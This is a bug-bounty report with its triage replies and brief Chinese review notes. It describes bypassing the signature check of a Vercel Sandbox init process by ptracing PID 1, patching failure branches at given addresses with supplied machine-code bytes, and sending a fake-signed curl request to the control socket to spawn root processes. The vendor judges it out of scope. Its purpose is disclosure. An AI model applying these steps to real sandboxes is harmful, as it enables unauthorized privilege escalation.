# H1 Report #3955363 — init.sock signature bypass → arbitrary root command execution

> 状态: **Not Applicable**(官方确认 out of scope)
> 提交: 2026-08-20(8 days ago) | 关闭: 2026-08-21(7 days ago)
> 报告者自行关闭(self-close),官方回复确认判定一致

## Report (原文)

### Summary
User code inside a Vercel Sandbox can ptrace PID 1 (sandbox-init, owner of /run/vercel/share/init.sock), patch its ed25519 signature-check failure paths in memory, then call SpawnService/Spawn on the control socket with a fake signature to run arbitrary commands with full capabilities (CapEff=000001ffffffffff); spawned processes can setuid(0) to root and reach the host rootfs block device /dev/vda (see companion report).

### Steps To Reproduce
Run inside a sandbox (python3 -c):
1. PTRACE_ATTACH(1) → OK (no Yama restriction), waitpid → pid 1
2. PTRACE_POKEDATA patch 3 signature-verify failure branches to force err=nil (Go ABI: error in rax/rbx): 0x83b571/0x83b5af: 31c031db4881c4d00000005dc3 · 0x82a9f9: 31c031db4881c4900000005dc3 (non-PIE binary, fixed addresses)
3. Call the socket with arbitrary signature (64×0x99) + any timestamp: curl --unix-socket /run/vercel/share/init.sock -H 'Content-Type: application/connect+json' -H 'Connect-Protocol-Version: 1' -H 'x-timestamp: <ms>' -H 'x-signature: <fake>' --data-binary $'\x00\x00\x00\x00\x27{"command":"id"}' http://localhost/vercel.sandbox.spawn.v1.SpawnService/Spawn → {"started":{"processId":"proc_3"}} + {"stdout":"<b64>uid=1000(vercel-sandbox)..."} + {"exit":{}}
4. Control (no patch): identical request → {"error":{"code":"unauthenticated","message":"invalid signature"}}
5. Spawned process: setuid(0) OK (real root), mount -t tmpfs OK, /dev/vda O_RDWR OK (host rootfs)

### Impact
- Full sandbox escape: arbitrary code execution as the sandbox control process, full Linux capability set, setuid(0) root in the shared host kernel
- Direct read/write of the host rootfs block device /dev/vda (host bind-mount sources, celld configs, CA certs) — persistent, cross-sandbox host compromise
- Signature scheme bypassed at process level; no private key recovery needed

### Root cause
sandbox-init runs with full capabilities and is ptrace-able from sandbox code (no Yama/seccomp protection); its signature-verify failure paths are mutable memory with a deterministic, patchable return convention (Go register ABI).

### Suggested fix
- Block PTRACE_ATTACH on PID 1 from sandbox processes (Yama ptrace_scope / seccomp)
- Drop capabilities from sandbox-init to the minimum; hide block devices (device-cgroup)
- Verify signatures in a separate host-side, non-ptrace-able process

### Attachments
- F6510659: vercel-sandbox-init-sig-bypass-poc.zip

## Timeline · 官方回复

### base_alert — closed the report, status → Not Applicable (7 days ago)
(报告者自行关闭)

### vercel-triage — comment (7 days ago)
> Thank you for your report. We have started our analysis and aim to triage it within 5 business days of submission; in all cases we will get back to you before October 1, 2026, when our triage window ends (see Response targets in the program policy). If we need more information to reproduce your finding, we will ask on this report.

### vercel-triage — comment (7 days ago)
> Thanks for the detailed write-up. Our assessment matches the self-close: this is out of scope for the challenge. Per the program policy (Out of scope), escapes that only reach the Firecracker guest OS — without reaching the EC2 host, another tenant, or defeating a firewall/credential control — are out of scope. Everything demonstrated here (ptrace of the guest init process, patching its signature check, spawning a process with full capabilities, setuid(0), /dev/vda access) stays inside your own microVM: each sandbox boots a dedicated guest kernel, and /dev/vda is the microVM's own system disk, not the host rootfs. The underlying primitives (full capability set, permissive seccomp, microVM disk access, sandbox-init key material) are also already on the policy's Known findings list and not bounty-eligible absent a new host-level or cross-tenant impact. We appreciate the effort that went into the PoC.

## 判定要点(供复盘)

- **官方确认**:ptrace guest init + 补丁签名校验 + 全 CapEff + setuid(0) + /dev/vda 访问,**全部停留在 own microVM → out of scope**
- **sandbox-init key material 已在 Known findings 清单**(官方明确点名)
- 无新 host 级/跨租户影响 → 无赏金
